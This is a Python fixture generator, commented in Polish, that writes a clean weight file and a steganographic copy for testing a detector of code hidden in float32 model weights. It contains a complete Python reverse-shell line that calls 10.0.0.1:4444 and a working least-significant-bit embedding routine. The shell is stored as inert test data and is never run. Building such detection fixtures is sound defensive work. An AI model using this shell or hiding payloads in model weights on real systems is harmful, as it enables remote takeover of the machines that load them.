"""Generator fixture'ów do wykrywania tensor steganography (LSB w float32).

Tworzy dwa pliki wag ``.npy``:

* ``clean_weights.npy`` — realistyczne wagi; ich LSB są praktycznie losowe,
  tak jak w normalnie wytrenowanym modelu.
* ``stego_weights.npy`` — te same wagi, ale w najmłodszych bitach mantysy
  ukryto **jawny ładunek tekstowy** (reverse shell w Pythonie). Wartości
  zmieniają się o ~1e-7, więc model nadal „działa", a payload siedzi w LSB.

To jest fixture do testowania WŁASNEGO detektora — payload jest jawny i
nieszkodliwy jako tekst (nie jest nigdzie wykonywany). Pokazuje kontrast:
czysty plik vs plik z ukrytym nośnikiem.
"""

from __future__ import annotations

import os

import numpy as np

SAMPLES_DIR = os.path.join(os.path.dirname(__file__), "samples")

# Jawny, czytelny ładunek — w realnym ataku wyciągnąłby go wyzwalacz (Lambda
# albo __reduce__). Tu służy tylko temu, by detektor miał co znaleźć.
HIDDEN_PAYLOAD = (
    b"#!/bin/sh\n"
    b"import os,socket,subprocess;"
    b"s=socket.socket();s.connect(('10.0.0.1',4444));"
    b"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
    b"subprocess.call(['/bin/sh','-i'])\n"
)


def _realistic_weights(n: int, seed: int = 7) -> np.ndarray:
    """Wagi o rozkładzie zbliżonym do wytrenowanej warstwy."""
    rng = np.random.default_rng(seed)
    return (rng.standard_normal(n) * 0.05).astype(np.float32)


def _embed_lsb(weights: np.ndarray, payload: bytes) -> np.ndarray:
    """Zaszywa bajty payloadu w najmłodszych bitach mantysy float32.

    Każdy bajt to 8 bitów (MSB-first), każdy bit nadpisuje LSB kolejnej wagi.
    """
    out = weights.copy()
    bits = np.unpackbits(np.frombuffer(payload, dtype=np.uint8))
    if bits.size > out.size:
        raise ValueError("payload dłuższy niż liczba wag — zwiększ rozmiar tablicy")
    as_uint = out.view(np.uint32)
    as_uint[: bits.size] = (as_uint[: bits.size] & np.uint32(0xFFFFFFFE)) | bits.astype(np.uint32)
    return out


def build(out_dir: str = SAMPLES_DIR) -> list[str]:
    os.makedirs(out_dir, exist_ok=True)
    written = []

    n = 8192  # z zapasem na payload (~95 bajtów = 760 bitów)
    clean = _realistic_weights(n)
    evil = _embed_lsb(clean, HIDDEN_PAYLOAD)

    clean_path = os.path.join(out_dir, "clean_weights.npy")
    evil_path = os.path.join(out_dir, "stego_weights.npy")
    np.save(clean_path, clean)
    np.save(evil_path, evil)
    written.extend([clean_path, evil_path])
    return written


if __name__ == "__main__":
    for path in build():
        print(f"zapisano {path} ({os.path.getsize(path)} B)")
    print(
        "\nUWAGA: 'stego_weights.npy' ma ładunek ukryty w LSB. Sam w sobie nic "
        "nie wykonuje — to nośnik bez wyzwalacza."
    )
